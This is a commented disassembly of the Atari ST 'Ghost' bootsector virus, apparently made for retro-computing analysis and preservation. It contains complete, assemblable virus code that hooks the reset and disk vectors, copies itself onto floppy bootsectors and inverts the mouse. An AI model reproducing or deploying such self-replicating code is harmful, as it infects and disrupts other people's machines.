; ----------------------------------------------------------------------------------------------------------
; Ghost Virus / Atari ST
; Original author: unknown
; Disassembled using Easy Rider from an infected disk bootsector dump
; Cleaned and commented by Shazz / MJJ Prod
; (c) 2024
; ----------------------------------------------------------------------------------------------------------

; ----------------------------------------------------------------------------------------------------------
; Debug, not in the original code
; imhex: set offset to $122 to "simulate" copy to $140
; ----------------------------------------------------------------------------------------------------------
_DEBUG_                 equ 1
DEBUG_ADDR              equ $310
; debug values
; 0.L: transient resident program address
; 4.B: number of times the HDV_HPB installer was called

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
PHYSTOP                 equ $42E
RESVEC_ENA              equ $426
RESVEC                  equ $42A
RESVEC_MAGIC            equ $31415926
RESIDENT_MAGIC          equ $12123456
RESIDENT_CHK            equ $5678
HDV_BPB                 equ $472
BOOT_CHK                equ $1234
PAGE_SIZE               equ 512

; xbios
XBIOS                   equ 14
KBDVBASE                equ $22
FLOPRD                  equ 8
FLOPWR                  equ 9
MOUSEVEC_OFFSET         equ 16

; variables
COUNTER_DEFAULT         equ $FFFFFFFB

; RAM locations
BOOTSECT_BUF            equ $4C6
RAM_ADDR                equ $140

; Relative addresses after copy to RAM_ADDR
RESET_VECTOR_ADDR       equ RAM_ADDR + (RESET_VECTOR - LOADER)
HDV_HPB_JMP_ADDR        equ RESET_VECTOR_ADDR + (HDV_HPB_ORIGINAL_VECTOR - RESET_VECTOR) + 2
COUNTER_ADDR            equ RESET_VECTOR_ADDR + (COUNTER - RESET_VECTOR)
INITMOUS_PARAMS_ADDR    equ RESET_VECTOR_ADDR + (INITMOUS_PARAMS - RESET_VECTOR)
HDV_HPB_VECTOR_ADDR     equ RESET_VECTOR_ADDR + (HDV_HPB_VECTOR - RESET_VECTOR)
RESET_VECTOR_PAGE       equ PAGE_SIZE*64
RESET_VECTOR_SUBPAGE    equ PAGE_SIZE*1

        ORG $0
        TEXT

; ----------------------------------------------------------------------------------------------------------
; Loader
; ----------------------------------------------------------------------------------------------------------
LOADER:
            MOVE.L    #$D6,D3                           ; D3 = 214
            LEA       RAM_ADDR.W,A1                     ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
            LEA       LOADER(PC),A2                     ; A2 @ LOADER
            MOVE.L    (A2),D2                           ; STOP IF L001 IS IN 0x140
            CMP.L     (A1),D2
            BEQ       LOADER_END
            MOVE.L    #RESVEC_MAGIC,D0                  ; ELSE D0 = 0x31415926
            CLR.L     D1                                ; D1 - 0
            CMP.L     RESVEC_ENA.W,D0                   ; IF @ 0x426 != 0x31415926 => If this location contains the magic number $31415926
                                                        ; then the system will jump through resvector (42A) on a system reset
            BNE       PASS_RESVEC                       ; GOTO PASS_RESVEC
            MOVE.L    RESVEC.W,D1                       ; ELSE D1 = 0x42A
PASS_RESVEC:
            LEA       ORIGINAL_RESET_VECTOR(PC),A0      ; A0 = payload start address (ORIGINAL_RESET_VECTOR)
            MOVE.L    D1,(A0)                           ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
            MOVE.L    #RESET_VECTOR_ADDR,D2             ; set relocated RESET_VECTOR address in D2 to be the reset vector address
            MOVE.L    D2,RESVEC.W                       ; resvector: If the magic number in resvalid is set properly, this vector will be
                                                        ; jumped through on a system reset with the return address placed in A6.
            MOVE.L    D0,RESVEC_ENA.W                   ; set magic value
COPY_LOADER:
            MOVE.W    (A2)+,(A1)+                       ; FOR i = 214 TO 0 (214 words so 428 bytes)
            DBF       D3,COPY_LOADER                    ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
            MOVE.L    #COUNTER_DEFAULT,COUNTER_ADDR.W   ; reset counter to -10
            BSR.S     INSTALL_HDV_HPB
LOADER_END: RTS

; ----------------------------------------------------------------------------------------------------------
; Reset vector flag and routine
; ----------------------------------------------------------------------------------------------------------
ORIGINAL_RESET_VECTOR:
            DCB.W     2,0                               ; $190: resvector address will be written here

; Concerning cold and warm reset. For every virus coder it is very important to know what's going on at reset
; sequence  esspecially concerning memory locations and system; vectors.
; In generally: in both reset cases memory is zeroed from (phystop - $200) to $800.
; Just before that, TOS searches memory in steps of two memory pages (512 bytes) in "hope" to find a
; following contents: longword $12123456 and a longword of actual double memory page.
; Note, as said, that if this code is the zeroed range, it will be exectuted THEN erased.

RESET_VECTOR:                                           ; $194
            MOVEA.L   PHYSTOP.W,A1                      ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
                                                        ; ghost looks to install itself at a required $200 boundary page
                                                        ; at page 40 ($8000) - 1 ($200)
            SUBA.L    #RESET_VECTOR_PAGE,A1
            SUBA.L    #RESET_VECTOR_SUBPAGE,A1          ; decrease a memory page (512 bytes)

            MOVE.L    A1,D1                             ; Save location address (needed to TOS)
            ifne _DEBUG_
            MOVE.L    D1,DEBUG_ADDR.W
            endc

            MOVE.L    #RESIDENT_MAGIC,(A1)+             ; Add magic word 0x12123456 that TOS looks for
            MOVE.L    D1,(A1)+                          ; then actual memory address of the magic work

                                                        ; In successful case, TOS first does a wrd
                                                        ; checksum, which has to be $5678. If that  is correct, the code on
                                                        ; that  double  memory  page  is  executed  through JSR with return
                                                        ; address in A6.

            LEA       INSTALL_HDV_HPB(PC),A3            ; A3 = INSTALL_HDV_HPB vector routine
            LEA       HDV_HPB_VECTOR(PC),A4             ; A3 = HDV_HPB_VECTOR copy routine
COPY_INSTALL_HDV_HPB:
            MOVE.W    (A3)+,(A1)+                       ; copy INSTALL_HDV_HPB vector routine after magic word / address
            CMPA.L    A4,A3                             ; until copy routine address in reached
            BLT.S     COPY_INSTALL_HDV_HPB

            LEA       LOADER(PC),A3                     ; A3 = bootloader start
            MOVE.L    A3,(A1)+                          ; then set it at the end (why? after RTS?)

            MOVEA.L   D1,A3                             ; Reset A3 to ram top location
            CLR.W     D0                                ; clear d0 to store checksum
            MOVE.W    #$FE,D2                           ; D2 = 254 words (2 pages)
CALC_RESIDENT_CHK:
            ADD.W     (A3)+,D0                          ; Compute checksum
            DBF       D2,CALC_RESIDENT_CHK              ;
            MOVE.W    #RESIDENT_CHK,D2                  ; then substract $5678 to adjust the checksum
            SUB.W     D0,D2                             ;
            MOVE.W    D2,(A3)                           ; copy this value to the end of the virus

            MOVE.L    #0,RESVEC_ENA.W                   ; remove magic value to resvector
            MOVEA.L   ORIGINAL_RESET_VECTOR(PC),A1      ; get reset vector address in a1
            CMPA.L    #0,A1                             ; check reset vector address is empty
            BNE       RESET_VECTOR_SET                  ; if not jump to reset vector address
            JMP       (A6)                              ; else jump to original resetvec return address
RESET_VECTOR_SET:
            JMP       (A1)

; ----------------------------------------------------------------------------------------------------------
; Install HDV_HPB Vector Replacement
; ----------------------------------------------------------------------------------------------------------
INSTALL_HDV_HPB:
            ifne _DEBUG_
            ADDQ.B    #1,4+DEBUG_ADDR.W
            endc
            MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value
            MOVE.L    HDV_BPB.W,D0                      ; hdv_bpb: This vector is used when Getbpb() is called.
                                                        ; A value of 0 indicates that no hard disk is attached.
                                                        ; Applications installing themselves here should expect
                                                        ; parameters to be located on the stack as they would be for the actual function call beginning at 4(sp).
                                                        ; If the installed process services the call it should RTS,
                                                        ; otherwise, leaving the stack intact, should JMP through the old vector value
            LEA       HDV_HPB_JMP_ADDR.W,A0             ; value of 0x2E0 JUMP address
            MOVE.L    D0,(A0)                           ; set original jum vector return to JMP
            LEA       HDV_HPB_VECTOR_ADDR.W,A0          ;
            MOVE.L    A0,HDV_BPB.W                      ; set vector to 0x20E (HDV_HPB_VECTOR)

            RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_HPB Vector Replacement - Core virus code
; ----------------------------------------------------------------------------------------------------------
HDV_HPB_VECTOR:
            MOVE.W    4(sp),D0                          ; hdv_bpb vector
            CMP.W     #2,D0                             ; if dev is not A or B (>=2), do to original vector
            BGE       HDV_HPB_ORIGINAL_VECTOR           ; else
            MOVEM.L   A0-sp/D7/D1-D5,-(sp)              ; duplicate bootloader
            MOVE.W    D0,D7                             ; D7 contains A or B (0 or 1)
            MOVE.L    #(0 << 16 | 1),-(sp)              ; count: 1 | side: 0
            MOVE.L    #(1 << 16 | 0),-(sp)              ; track: 0 | sector: 1
            MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
            CLR.L     -(sp)                             ; rsrvd => 0
            LEA       BOOTSECT_BUF.W,A5
            MOVEA.L   (A5),A5                           ;
            MOVEA.L   A5,A6                             ;
            MOVE.L    A5,-(sp)                          ; buf = (BOOTSECT_BUF)
            MOVE.W    #FLOPRD,-(sp)                     ; FLOPRD
            TRAP      #XBIOS
            ADDA.L    #$14,sp                           ; fix stack
            TST.W     D0                                ; 0 = success
            BMI       HDV_HPB_VECTOR_END                ; else quit
PATCH_BOOT:
            MOVE.W    #$601C,(A5)                       ; patch read bootloader buffer with BRA
            ADDA.L    #$1E,A5                           ; advance buffer to bootloader start ($1E)
            LEA       LOADER(PC),A4                     ; A4 = start bootsector program
            LEA       PROG_END(PC),A3                   ; A3 = end
COPY_LOADER_2:
            MOVE.W    (A4)+,(A5)+                       ; copy virus prg
            CMPA.L    A3,A4
            BLT.S     COPY_LOADER_2
            MOVEA.L   A6,A5
            MOVE.W    #$FE,D1                           ; D1 = 254 bytes
            MOVE.W    #BOOT_CHK,D0                      ; CHK bootsector value
CALC_BOOT_CHK:
            SUB.W     (A5)+,D0
            DBF       D1,CALC_BOOT_CHK
            MOVE.W    D0,(A5)                           ; add remainder to make bootsector executable

            MOVE.L    #(0 << 16 | 1),-(sp)              ; count: 1 | side: 0
            MOVE.L    #(1 << 16 | 0),-(sp)              ; track: 0 | sector: 1
            MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
            CLR.L     -(sp)                             ; rsrvd = 0
            MOVE.L    A6,-(sp)                          ; buf = (BOOTSECT_BUF)
            MOVE.W    #FLOPWR,-(sp)                     ; FLOPWR
            TRAP      #XBIOS
            ADDA.L    #$14,sp                           ; fix stack
            TST.W     D0                                ; success if 0
            BMI       HDV_HPB_VECTOR_END                ; else quit
            ADDI.L    #1,COUNTER_ADDR.W                 ; add replication counter of 1
            CMPI.L    #5,COUNTER_ADDR.W                 ; if not 5 quit (starting fron 251, meaning 10 iterations then reset to 0 so 5 to 5)
            BNE       HDV_HPB_VECTOR_END
            CLR.L     COUNTER_ADDR.W                    ; else set mousevec
            MOVE.W    #KBDVBASE,-(sp)                   ; Kbdvbase() returns a pointer to a system structure containing a ‘jump’ table to system vector handlers.
            TRAP      #XBIOS
            ADDQ.L    #2,sp                             ; fix stack, midivec, vkbderr, vmiderr , statvec, mousevec, clockvec, joyvec pointers struct in set in D0
            ADD.L     #MOUSEVEC_OFFSET,D0               ; D0+16 => mousevec
            EXG       A0,D0                             ; A0 = mousevec address

            MOVE.L    (A0),-(sp) ;4                     ; add mousev vector to stack
            PEA       INITMOUS_PARAMS(PC)  ;4           ; push INITMOUS_PARAMS content: 0x01 | 0x01 | 0x01 | 0x01
                                                        ; param 0 = 1 : y origin at top, this will inverse
                                                        ; param 1 = 1 : buttons events as mouse packets
                                                        ; param 2 = 1 : x theshold increment of 1
                                                        ; param 3 = 1 : y threshold increment of 1
            MOVE.L    #1,-(sp)   ;4                     ; 0 | 1 : opcode 0 initmouse, mode 1: mouse in relative
            TRAP      #XBIOS                            ; XBIOS initmouse(mode, params, vector)
            ADDA.L    #$C,sp     ;12                    ; fix stack

            EORI.B    #1,INITMOUS_PARAMS_ADDR.W         ; Invert INITMOUS_PARAMS_ADDR[0] = y origin to 1 to let people think this is done :D
HDV_HPB_VECTOR_END:   MOVEM.L   (sp)+,A0-A6/D1-D7

HDV_HPB_ORIGINAL_VECTOR:
            JMP       $00FC0FCA                         ; will be patched to contain hdv_bpb original vector address

INITMOUS_PARAMS:
            DC.B      $01                               ; y origin at top
            DC.B      $01                               ; buttons events
            DC.B      $01                               ; x threshold
            DC.B      $01                               ; y threshold

COUNTER:
            DC.L      COUNTER_DEFAULT                   ; replication counter, initialized at -5

END:        DC.B      $00,$00

PROG_END:DCB.W        24,0                              ; useless, kept for checking result is
            DC.B      'J',$97                           ; identical to the original virus

    END
